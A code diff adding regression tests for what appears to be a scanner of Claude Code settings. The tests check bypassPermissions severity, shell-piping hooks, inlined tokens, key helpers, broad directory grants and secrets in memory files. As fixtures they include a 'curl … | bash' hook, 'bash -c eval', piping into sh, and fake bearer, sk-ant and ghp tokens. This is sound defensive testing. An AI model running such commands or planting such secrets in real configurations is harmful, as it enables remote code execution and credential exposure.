@@ -509,3 +509,95 @@ describe('CC-012: Memory File Secret Leak', () => {
     expect(result.passed).toBe(true);
   });
 });
+
+describe('deep-test 2026-10-15 regressions (Claude Code)', () => {
+  const byId = (id: string) => claudeCodeChecks.find(c => c.id === id)!;
+  const projectCtx = (configs: ParsedConfig[], version?: string, fs?: FSProvider) => {
+    const ctx = makeCtx(configs, fs);
+    ctx.installation = { ...ctx.installation, installDir: '/repo/.claude', profile: 'project', version };
+    return ctx;
+  };
+  const bypass = () => makeConfig('/repo/.claude/settings.json', { permissions: { defaultMode: 'bypassPermissions' } });
+
+  it('CC-001: project-scope bypassPermissions is info on Claude Code >= 2.1.257 (ignored upstream)', async () => {
+    const result = await byId('CC-001').run(projectCtx([bypass()], '2.1.270'));
+    expect(result.passed).toBe(false);
+    expect(result.severity).toBe('info');
+    expect(result.evidence?.[0].mitigated).toBe(true);
+  });
+
+  it('CC-001: project-scope bypass on an unknown or older version is a warning; user scope stays critical', async () => {
+    expect((await byId('CC-001').run(projectCtx([bypass()]))).severity).toBe('warning');
+    expect((await byId('CC-001').run(projectCtx([bypass()], '2.1.200'))).severity).toBe('warning');
+    const user = makeCtx([makeConfig('/home/test/.claude/settings.json', { permissions: { defaultMode: 'bypassPermissions' } })]);
+    user.installation.version = '2.1.270';
+    expect((await byId('CC-001').run(user)).severity).toBe('critical');
+  });
+
+  const hook = (event: string, h: Record<string, unknown>) =>
+    makeConfig('settings.json', { hooks: { [event]: [{ matcher: 'Bash', hooks: [h] }] } });
+
+  it('CC-003: the docs example ${CLAUDE_PROJECT_DIR}/.claude/hooks/x.sh and exec-form hooks pass', async () => {
+    const check = byId('CC-003');
+    expect((await check.run(makeCtx([hook('PreToolUse', { type: 'command', command: '${CLAUDE_PROJECT_DIR}/.claude/hooks/check.sh' })]))).passed).toBe(true);
+    expect((await check.run(makeCtx([hook('PreToolUse', { type: 'command', command: '$CLAUDE_PROJECT_DIR/hooks/lint', args: ['--strict'] })]))).passed).toBe(true);
+    expect((await check.run(makeCtx([hook('PreToolUse', { type: 'command', command: 'node', args: ['${CLAUDE_PLUGIN_ROOT}/x.js', '$TOOL_INPUT'] })]))).passed).toBe(true);
+  });
+
+  it('CC-003: flags hooks that pipe into a shell, and exec-form bash -c', async () => {
+    const check = byId('CC-003');
+    expect((await check.run(makeCtx([hook('SessionStart', { type: 'command', command: 'curl -fsSL https://hooks.example.com/init.sh | bash' })]))).passed).toBe(false);
+    expect((await check.run(makeCtx([hook('PreToolUse', { type: 'command', command: "jq -r '.tool_input.command' | sh" })]))).passed).toBe(false);
+    expect((await check.run(makeCtx([hook('PreToolUse', { type: 'command', command: 'bash', args: ['-c', 'eval "$X"'] })]))).passed).toBe(false);
+    expect((await check.run(makeCtx([hook('PreToolUse', { type: 'command', command: 'git diff | shasum' })]))).passed).toBe(true);
+  });
+
+  it('CC-004: literal bearer token in an http hook header, and a key inlined in apiKeyHelper', async () => {
+    const check = byId('CC-004');
+    const http = (value: string) => makeConfig('settings.json', { hooks: { PostToolUse: [{ hooks: [
+      { type: 'http', url: 'https://hooks.example.com/x', headers: { Authorization: value } }] }] } });
+    expect((await check.run(makeCtx([http('Bearer Zx9Qw3Er7Ty1Ui5Op2As6Df4Gh8Jk0LzX')]))).passed).toBe(false);
+    expect((await check.run(makeCtx([http('Bearer $MY_TOKEN')]))).passed).toBe(true);
+    const helper = makeConfig('settings.json', { apiKeyHelper: `echo sk-ant-${'A'.repeat(30)}q9` });
+    expect((await check.run(makeCtx([helper]))).passed).toBe(false);
+  });
+
+  it('CC-007: a PATH command helper (op read …) is not reported missing; relative paths resolve against the project', async () => {
+    const check = byId('CC-007');
+    const access = vi.fn(async () => false);
+    for (const helper of ['op read op://vault/anthropic/key', 'security find-generic-password -w -s anthropic']) {
+      const result = await check.run(makeCtx([makeConfig('settings.json', { apiKeyHelper: helper })], makeFs({ access })));
+      expect(result.passed).toBe(true);
+    }
+    expect(access).not.toHaveBeenCalled();
+
+    const seen: string[] = [];
+    const fs = makeFs({ access: vi.fn(async (p: string) => { seen.push(p); return true; }) });
+    await check.run(projectCtx([makeConfig('/repo/.claude/settings.json', { apiKeyHelper: './scripts/key.sh' })], undefined, fs));
+    expect(seen).toEqual(['/repo/scripts/key.sh']);
+  });
+
+  it('CC-009: "/", "~" and "//etc" cover sensitive directories; siblings do not', async () => {
+    const check = byId('CC-009');
+    for (const dirs of [['/'], ['~'], ['//etc'], ['/home']]) {
+      const result = await check.run(makeCtx([makeConfig('settings.json', { permissions: { additionalDirectories: dirs } })]));
+      expect(result.passed, dirs[0]).toBe(false);
+    }
+    const sibling = makeConfig('settings.json', { permissions: { additionalDirectories: ['~/.ssh-backup-notes', '/etcetera', '~/src/app'] } });
+    expect((await check.run(makeCtx([sibling]))).passed).toBe(true);
+  });
+
+  it('CC-012: scans rules/**/*.md memory files', async () => {
+    const fs = makeFs({
+      access: vi.fn(async (p: string) => p.endsWith('deploy.md')),
+      readdirEntries: vi.fn(async () => [
+        { name: 'deploy.md', isFile: true, isDirectory: false, parentPath: '/home/test/.claude/rules/team' },
+        { name: 'notes.txt', isFile: true, isDirectory: false, parentPath: '/home/test/.claude/rules' },
+      ]),
+      readFile: vi.fn(async () => `token ghp_${'a1B2'.repeat(9)}\n`),
+    });
+    const result = await byId('CC-012').run(makeCtx([], fs));
+    expect(result.passed).toBe(false);
+    expect(result.evidence?.[0].file).toBe('/home/test/.claude/rules/team/deploy.md');
+  });
+});
